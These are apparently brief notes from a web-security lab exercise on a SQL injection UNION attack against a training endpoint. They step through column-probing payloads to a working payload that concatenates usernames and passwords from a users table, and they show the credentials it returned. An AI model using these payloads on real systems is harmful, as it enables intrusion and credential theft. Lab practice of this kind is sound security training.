SQL injection UNION attack, retrieving multiple values in a single column

endpoint: /vulnerabilities/sqli_union/union_select.php 
perform a SQL injection UNION attack that retrieves all usernames and passwords

Analysis: 
UNION SELECT NULL, NULL-- 
-- gives all columns

UNION SELECT NULL, abc 
--  we replace the second NULL with a string to see if we can retrieve data from the second column

+UNION+SELECT+NULL,username||'~'||password+FROM+users--

wiener~6nyvoc8jjd9kqm84kzhj
administrator~r99ktkm6e364dfa3n54g
